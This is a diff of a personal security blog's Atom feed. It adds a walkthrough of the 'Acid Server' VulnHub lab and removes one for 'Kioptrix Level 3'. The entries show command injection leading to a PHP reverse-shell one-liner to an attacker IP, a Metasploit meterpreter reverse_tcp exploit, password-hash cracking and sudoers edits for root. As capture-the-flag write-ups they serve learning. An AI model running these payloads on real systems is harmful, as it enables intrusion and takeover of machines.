@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-08-30T15:41:37-05:00</updated>
+  <updated>2016-09-09T15:25:04-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,121 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Acid Server]]></title>
+    <link href="http://wg135.github.io/blog/2016/09/03/acid-server/"/>
+    <updated>2016-09-03T12:56:03-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/09/03/acid-server</id>
+    <content type="html"><![CDATA[<h2>Tools:</h2>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>DirBuster</li>
+<li>Burp</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/37088/">Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.170is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.170 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 33447 is open and running http service.</p>
+
+<p>run wfuzz,</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.170:33447/FUZZ 2&gt;/dev/null</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a path <code>Challenge</code></p>
+
+<p>use DirBuster, check <code>http://192.168.41.170:33447/Challenge/</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Check cake.php</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check source code,</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find <code>/Magic_Box</code> may be a hidden path</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use DirBuster again,</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>command.php</code> looks interesting.</p>
+
+<p>check that page:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>type <code>127.0.0.1</code> and use Burp</p>
+
+<p>looks like it pings the IP address I typed</p>
+
+<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_010.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p>now try <code>127.0.0.1;id</code></p>
+
+<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_011.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p>works. So there is a command injection vulnerability.</p>
+
+<p>In burp, instead of <code>id</code> command, using (URL encode):</p>
+
+<p><code>php -r '$sock=fsockopen("192.168.41.149",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>
+
+<p>get the shell</p>
+
+<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_012.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>after some enumeration</p>
+
+<p><code>cat /etc/*-release</code></p>
+
+<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_013.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p>Target is running Ubuntu 15.04</p>
+
+<p><code>earchsploit ubuntu | grep 15.04</code></p>
+
+<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_014.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p>Since the target doesn&rsquo;t have wget and gcc, I setup ftp srever and compile the code locally and upload it.</p>
+
+<p>get root</p>
+
+<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_015.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[NullByte 1]]></title>
@@ -4606,140 +4721,6 @@ It is i686. Oh different&hellip;.</p>
 <p>and get the shell:</p>
 
 <p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[vulhub-Kioptrix Level 3]]></title>
-    <link href="http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3/"/>
-    <updated>2016-06-09T11:42:38-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3</id>
-    <content type="html"><![CDATA[<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>Nikto</li>
-<li>Metasploit</li>
-<li>Wfuzz</li>
-<li>Hashcat</li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.184 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Ports 22 and 80 are opening.</p>
-
-<p>Now use Nikto to scan:</p>
-
-<p><code>nikto -h 192.168.79.184</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Nothing excited.</p>
-
-<p>Now lets browser the web page in the target.</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Find the target may use LotusCMS.</p>
-
-<p>In msfconsole:</p>
-
-<p><code>search LotusCMS</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>find one exploit</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/lcms_php_exec 
-</span><span class='line'>msf exploit(lcms_php_exec) &gt; set rhost 192.168.79.184
-</span><span class='line'>msf exploit(lcms_php_exec) &gt; set uri 
-</span><span class='line'>msf exploit(lcms_php_exec) &gt; set payload php/meterpreter/reverse_tcp
-</span><span class='line'>msf exploit(lcms_php_exec) &gt; set lhost 192.168.79.173
-</span><span class='line'>exploit</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Got the shell, next step is try to get root.</p>
-
-<p>In this step, I tried to enumeration all kinds of shit and use serveral vernerable kernel exploits to get the root but failed. During the emumeration. I found a ffile gconfig.php is interesting. Then I found that:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>maybe the  username/password for ssh, but no. Thats too easy.</p>
-
-<p>So that I go back to use wfuzz the scan the http services.</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like it has phpmyadmin. Try that:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Log in using the username/password that just found. Successed.</p>
-
-<p>review the content, found this:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now found two users and the hashed passwords:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Copy the passwords to a file use hashcat to crack it:</p>
-
-<p><code>hashcat hash.txt /user/share/wordlists/rockyou.txt</code></p>
-
-<p>get both passwords:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>ssh to the target, search the SUID binaries:</p>
-
-<p><code>find / -perm +6000 -type f -exec ls -ld {} \;</code></p>
-
-<p>found an interesting file /uss/local/bin/ht, I googled it and found it is a hex editor.</p>
-
-<p>now try to use it to open /etc/sudoers file, get error message. to fix it:</p>
-
-<p><code>export TERM=xterm</code></p>
-
-<p>change the loneferret permission:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>get the root</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>DONE</p>
 ]]></content>
